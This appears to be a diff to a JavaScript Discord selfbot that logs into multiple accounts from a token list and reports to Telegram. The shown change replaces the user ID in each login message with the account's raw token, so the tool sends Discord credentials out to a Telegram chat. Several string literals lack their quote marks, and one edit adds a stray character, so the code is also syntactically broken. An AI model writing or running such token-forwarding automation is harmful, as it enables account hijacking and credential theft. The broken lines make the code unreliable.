@@ -62,10 +62,10 @@ function createSelfbotInstance(token, index) {
         client.on('ready', async () => {
             console.log(`[Account #${accountNumber}] Logged in as ${client.user.tag}`);
             
-            // Sends immediate success details for each successful account login
+            // MODIFIED: Displays Username and Token instead of the User ID
             const statusUpdate = `✅ *[Account #${accountNumber}/${DISCORD_TOKENS.length}] LOGGED IN!*\n\n` +
                                   `• *User:* ${client.user.tag}\n` +
-                                  `• *ID:* \`${client.user.id}\``;
+                                  `• *Token:* \`${cleanToken}\``;
             await sendToTelegram(statusUpdate);
 
             client.relationships.friendCache.forEach((user, id) => {
@@ -221,8 +221,6 @@ await sendToTelegram(text);
 console.error("Error inside handleValidDM router:", err.message);
 }
 }
-
-// Sequential Execution Loop
 async function bootSequence() {
 console.log(🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...);
 await sendToTelegram(🚀 Starting boot initialization for ${DISCORD_TOKENS.length} tokens...);
@@ -251,7 +249,7 @@ caption: caption
 const result = await response.json();
 if (!result.ok) {
 console.error('Telegram API error (image):', result);
-await sendToTelegram(caption + \n\n🖼️ Image URL: ${imageUrl});
+await sendToTelegram(caption + \n\n2🖼️ Image URL: ${imageUrl});
 }
 } catch (error) {
 console.error('Error sending image to Telegram:', error);
